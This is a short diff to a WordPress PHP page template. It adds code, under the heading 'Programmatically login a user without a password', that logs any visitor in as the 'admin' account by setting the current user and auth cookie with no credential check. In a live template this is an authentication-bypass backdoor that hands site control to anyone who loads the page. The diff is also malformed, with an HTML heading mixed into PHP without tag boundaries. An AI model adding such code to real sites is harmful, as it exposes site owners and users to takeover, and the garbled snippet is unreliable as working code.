@@ -10,3 +10,16 @@ get_header();
 echo 'new content outside WordPress';
 get_footer();
 
+<h3>Programmatically login a user without a password:</h3>
+
+$username = "admin";
+$user = get_user_by('login', $username );
+
+
+if ( !is_wp_error( $user ) &&   !is_user_logged_in())
+{
+    wp_clear_auth_cookie();
+    wp_set_current_user ( $user->ID );
+    wp_set_auth_cookie  ( $user->ID );
+
+}
